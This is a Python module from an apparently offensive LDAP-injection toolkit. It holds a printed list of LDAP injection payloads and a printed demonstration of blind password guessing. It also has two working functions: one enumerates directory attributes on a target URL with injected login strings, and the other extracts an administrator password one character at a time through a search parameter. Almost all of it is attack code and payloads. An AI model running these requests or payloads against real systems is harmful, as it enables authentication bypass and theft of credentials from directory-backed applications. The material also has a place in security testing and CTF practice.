from colorama import Fore
from .. import date
import requests, string, sys

def payloads_list():
    print("\n" + date.INFO() + "LDAP Payloads list:\n")
    print('''*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y''')

def blind_exploitation():
    print("\n" + date.INFO() + "LDAP Payloads list:\n")
    print('''(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=*''' + Fore.WHITE + '''))
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''A''' + Fore.RED + '''*''' + Fore.WHITE + '''))
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''B''' + Fore.RED + '''*''' + Fore.WHITE + '''))
...
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''M''' + Fore.RED + '''*''' + Fore.WHITE + '''))
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''MA''' + Fore.RED + '''*''' + Fore.WHITE + '''))
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''MB''' + Fore.RED + '''*''' + Fore.WHITE + '''))
...
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''MY''' + Fore.RED + '''*''' + Fore.WHITE + '''))
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''MYA''' + Fore.RED + '''*''' + Fore.WHITE + '''))
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''MYB''' + Fore.RED + '''*''' + Fore.WHITE + '''))
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''MYC''' + Fore.RED + '''*''' + Fore.WHITE + '''))
...
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''MYK''' + Fore.RED + '''*''' + Fore.WHITE + '''))
(&(sn''' + Fore.RED + '''=''' + Fore.WHITE + '''administrator)(password''' + Fore.RED + '''=''' + Fore.WHITE + '''MYKE))''')

def discover_ldap(url):
    try:
        fields = []
        f = open('src/ldap/LDAP_attributes.txt', 'r') #Open the wordlists of common attributes
        wordl = f.read().split('\n')
        f.close()
        for i in wordl:
            r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
            if 'TRUE CONDITION' in r.text:
                fields.append(str(i))
        if fields == []:
            print("\n" + date.FAILED() + "Not vulnerable")
            sys.exit()
        print("\n" + date.SUCCESS() + fields)
    except requests.exceptions.ConnectionError:
        print("\n" + date.ERROR() + "URL not found")
        sys.exit()
    except requests.exceptions.ConnectTimeout:
        print("\n" + date.ERROR() + "Connect Time out")
        sys.exit()

def special_blind_ldap(url):
    try:
        alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"
        flag = ""
        print()
        for i in range(50):
            print(date.INFO() + "Looking for number " + str(i))
            for char in alphabet:
                r = requests.get(url + "?action=dir&search=admin*)(password=" + flag + char)
                if ("TRUE CONDITION" in r.text):
                    flag += char
                    print("\n" + date.SUCCESS() + "[+] Flag: " + flag)
                    break
                if i == 50:
                    print("\n" + date.FAILED() + "Not vulnerable")
                    sys.exit()
    except requests.exceptions.ConnectionError:
        print("\n" + date.ERROR() + "URL not found")
        sys.exit()
    except requests.exceptions.ConnectTimeout:
        print("\n" + date.ERROR() + "Connect Time out")
        sys.exit()